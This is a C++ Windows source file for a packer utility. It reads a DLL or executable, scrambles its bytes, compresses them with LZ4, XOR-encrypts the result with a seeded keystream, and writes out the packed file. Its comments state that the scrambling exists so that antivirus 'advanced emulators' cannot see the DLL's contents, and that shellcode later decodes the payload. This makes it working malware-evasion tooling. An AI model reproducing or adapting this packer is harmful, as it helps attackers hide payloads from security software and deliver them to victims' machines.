// main.cpp : Defines the entry point for the application.


// perform essential compiler settings
// remove stdlib 
#pragma comment(linker, "/NODEFAULTLIB:libcmt.lib") 
#pragma comment(linker, "/NODEFAULTLIB:MSVCRT.lib")
#pragma comment(linker, "/NODEFAULTLIB:MSVCRTD.lib")
#pragma comment(linker, "/NODEFAULTLIB:libcmtd.lib")


#include <windows.h>

#include "..\inc\mem.h"
#include "..\inc\dbg.h"
#include "..\inc\RandomGen.h"
#include "..\inc\MyStringRoutines.h"

#include "..\inc\LZ4\lz4.h"

#if defined(_M_X64)
	// x64 system libs
	#pragma comment (lib, ".\\lib\\amd64\\BufferOverflowU.lib")
	#pragma comment (lib, ".\\lib\\amd64\\ntdll.lib")
#elif defined(_M_IX86)
	// x32 system libs
	#pragma comment (lib, ".\\lib\\i386\\BufferOverflowU.lib")
	#pragma comment (lib, ".\\lib\\i386\\ntdll.lib")
#else
	#error Unknown target CPU, no system libs can be found
#endif

 



#include "main.h"


BOOL ReadFileContents(LPWSTR wszName, LPVOID *pResBuff, SIZE_T *lResLen)
{
	BOOL bRes = FALSE;	// func res
	HANDLE hFile;		// opened file handle
	DWORD dwDummy;	// dummy misc

	hFile = CreateFile(wszName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
	if (INVALID_HANDLE_VALUE != hFile) {

		*lResLen = GetFileSize(hFile, &dwDummy);
		*pResBuff = my_alloc(*lResLen);

		if (ReadFile(hFile, *pResBuff, (DWORD)*lResLen, &dwDummy, NULL)) { bRes = TRUE; }

		CloseHandle(hFile);
	}

	return bRes;
}


VOID WriteFileContents(LPWSTR wszName, LPVOID pData, SIZE_T lLen)
{
	HANDLE hFile;
	DWORD dwWritten;

	hFile = CreateFile(wszName, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (INVALID_HANDLE_VALUE != hFile) {

		WriteFile(hFile, pData, lLen, &dwWritten, NULL);

		FlushFileBuffers(hFile);
		CloseHandle(hFile);

	}
	else { ExitProcess(1); }

}


VOID Scramble(LPVOID pData, SIZE_T lLen)
{
	BYTE *p = (BYTE *)pData;
	SIZE_T lCounter = lLen;

	BYTE bCode; 

	RndClass *rg;

	// init rng
	rg = (RndClass *)my_alloc(sizeof(RndClass));
	rgNew(rg);
	rg->rgInitSeed(rg, 0x14, lLen);

	while (lCounter) {

		bCode = (BYTE)rg->rgGetRnd(rg, 0, 255);
		*p = *p ^ bCode;


		p++; lCounter--;

	}

}


#define ROTL8(x,r) (x << r) | (x >> (8 - r));

VOID EasyScramble(LPVOID pData, SIZE_T lLen)
{
	BYTE *p = (BYTE *)pData;
	SIZE_T lCounter = lLen;

	while (lCounter) {


		*p = ROTL8(*p, 2);

		p++; lCounter--;

	}

}

VOID DoPack(LPWSTR wszSource, LPWSTR wszDest)
{
	LPVOID pIn, pOut;
	SIZE_T lIn, lOut;

	LPWSTR wszCD, wszIn, wszOut;

	// append curdir
	wszCD = (LPWSTR)my_alloc(10240);
	wszIn = (LPWSTR)my_alloc(10240);
	wszOut = (LPWSTR)my_alloc(10240);
	GetModuleFileName(NULL, wszCD, 1024);

	// cut at filename
	sr_replacelastchar(wszCD, '\\', 0x0000);

	
	lstrcpy(wszIn, wszCD);
	lstrcat(wszIn, L"\\");
	lstrcat(wszIn, wszSource);

	lstrcpy(wszOut, wszCD);
	lstrcat(wszOut, L"\\");
	lstrcat(wszOut, wszDest);

	if (ReadFileContents(wszIn, &pIn, &lIn)) {

		// initial scramble in order for advanced emulators
		// not to see dll's contents - it should finally be descramblered
		// by shellcode. This routine should leave the entropy as is.
		EasyScramble(pIn, lIn);

		lOut = LZ4_compressBound((int)lIn);
		pOut = my_alloc(lOut);

		lOut = LZ4_compress((CHAR *)pIn, (CHAR *)pOut, (int)lIn);

		// scrambling
		Scramble(pOut, lOut);

		WriteFileContents(wszOut, pOut, lOut);

	} else { DbgPrint("ERR: [%ws] not found", wszIn); ExitProcess(2); }


}





// entrypoint function for exe file
void __stdcall main()
{
	LPWSTR *szArglist;
	int nArgs;
//	int i;

	szArglist = CommandLineToArgvW(GetCommandLineW(), &nArgs);
	if (NULL == szArglist) { DbgPrint("ERR: no params specified"); ExitProcess(1); }
	if (nArgs != 3) { DbgPrint("ERR: invalid params count speficied, expected 2, received %u", nArgs-1); ExitProcess(1); }

	//for (i = 0; i < nArgs; i++) { DbgPrint("ARG %d: %ws", i, szArglist[i]); }

	// repacks dll
	DoPack(szArglist[1], szArglist[2]);
//	DoPack(L"rse64.exe", L"rse64.exe.lz4");


	ExitProcess(0);
}






